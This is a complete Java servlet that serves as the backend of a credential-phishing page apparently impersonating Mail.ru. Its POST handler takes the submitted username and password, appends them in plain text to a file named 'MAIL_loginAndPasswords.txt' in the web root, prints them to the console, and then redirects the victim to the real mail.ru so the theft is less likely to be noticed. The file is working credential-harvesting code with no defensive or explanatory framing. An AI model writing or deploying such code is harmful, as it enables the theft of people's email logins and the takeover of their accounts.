import javax.servlet.ServletContext;
import javax.servlet.annotation.WebServlet;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
@WebServlet("/mailsupport")
public class MailServlet extends javax.servlet.http.HttpServlet {
    protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException {

            request.setCharacterEncoding("UTF-8");
            String login = request.getParameter("username");
            String password = request.getParameter("password");
            FileWriter fileWriter = new FileWriter(new File(getServletContext().getRealPath("/")+"MAIL_loginAndPasswords.txt"),true);
            fileWriter.write(login+" "+password);
            fileWriter.append(System.getProperty("line.separator"));
            fileWriter.close();
            System.out.println(login + " 1");
            System.out.println(password + " 2");

        response.sendRedirect("https://mail.ru");
    }

    protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException {

    }
}
